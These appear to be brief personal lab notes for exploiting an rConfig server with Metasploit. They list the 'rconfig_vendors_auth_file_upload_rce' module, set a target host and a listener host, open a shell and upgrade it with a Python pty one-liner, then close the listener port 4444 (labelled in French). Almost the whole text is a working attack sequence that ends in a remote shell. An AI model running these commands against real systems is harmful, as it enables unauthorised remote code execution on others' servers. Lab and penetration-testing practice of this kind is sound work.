sudo msfconsole
search rconfig
exploit/linux/http/rconfig_vendors_auth_file_upload_rce
set RHOSTS 10.129.201.101
set LHOST 10.10.14.79
exploit
shell
python -c 'import pty; pty.spawn("/bin/sh")'


Fermer le port 4444 :
lsof -i :4444
kill $(lsof -t -i:4444)
   
